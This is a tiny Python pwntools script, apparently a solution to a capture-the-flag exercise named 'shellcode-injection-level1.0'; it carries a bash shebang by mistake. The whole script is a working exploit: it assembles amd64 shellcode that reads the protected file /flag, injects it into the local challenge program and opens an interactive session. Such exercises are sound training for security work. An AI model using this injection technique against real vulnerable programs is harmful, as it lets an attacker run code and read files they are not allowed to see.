#!/usr/bin/bash

from pwn import *

context(arch = 'amd64' , os = 'linux')
shellcode = shellcraft.cat('/flag')

payload = asm(shellcode)

sh = process("/challenge/shellcode-injection-level1.0")
sh.send(payload)
sh.interactive()